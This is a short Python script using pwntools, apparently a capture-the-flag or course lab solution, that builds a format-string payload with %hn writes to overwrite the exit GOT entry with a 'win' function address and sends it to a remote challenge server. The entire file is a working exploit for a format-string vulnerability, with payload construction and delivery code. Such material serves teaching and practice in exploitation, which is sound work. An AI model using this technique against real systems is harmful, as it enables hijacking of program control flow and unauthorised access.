from pwn import *

def writeWhatWhere(what, where, offset=0):
    addr1 = p32(where)              # address for first 2 bytes
    addr2 = p32(where + 2)          # address last 2 bytes
    what1 = (what & 0xffff)         # first 2 bytes
    what2 = (what >> 16) & 0xffff   # last 2 bytes
    backToZero = 0x10000 - what1    # back to zero the first 2 bytes
    return addr1 + addr2 + bytes('%0{}x'.format(what1 - 8) + '%{}$hn'.format(offset) +\
    '%0{}x'.format(backToZero) + '%0{}x'.format(what2) + '%{}$hn'.format(offset + 1), 'utf-8')


winAddrs = 0x804849b
offset = 7
# eip = 0xffffcdec
exitPlt = 0x804a018
# P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10057)

#P.send(b"AAAA" + b"%08x."*10)
P.send(writeWhatWhere(winAddrs, exitPlt, offset))

P.interactive()